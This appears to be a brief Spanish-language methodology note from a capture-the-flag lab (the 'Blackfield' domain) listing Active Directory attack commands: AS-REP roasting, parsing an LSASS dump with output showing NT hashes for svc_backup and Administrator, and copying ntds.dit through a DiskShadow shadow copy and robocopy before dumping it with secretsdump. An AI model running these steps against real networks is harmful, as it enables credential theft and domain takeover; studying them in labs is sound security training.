# Metodología

## ASPRepRoast Attack
```null
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192
```

## Decrypt LSASS
```null
pypykatz lsa minidump lsass.DMP

INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
[...]
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
[...]
luid 153705
	== MSV ==
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
```

## Dumpear NTDS

### Backup del System
```null
reg save HKLM\SYSTEM system.bak
```

### Backup del NTDS

#### Creación de unidad lógica temporal

**Fichero.txt**
```null
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
```

#### Procesación con DiskShadow
```null
diskshadow /s fichero.txt
```

#### Copia de RoboCopy
```null
robocopy /b z:\windows\ntds . ntds.bak
```

#### Dumpeo hashes NT,LM
```null
impacket-secretsdump -ntds ntds.dit -system system local
```

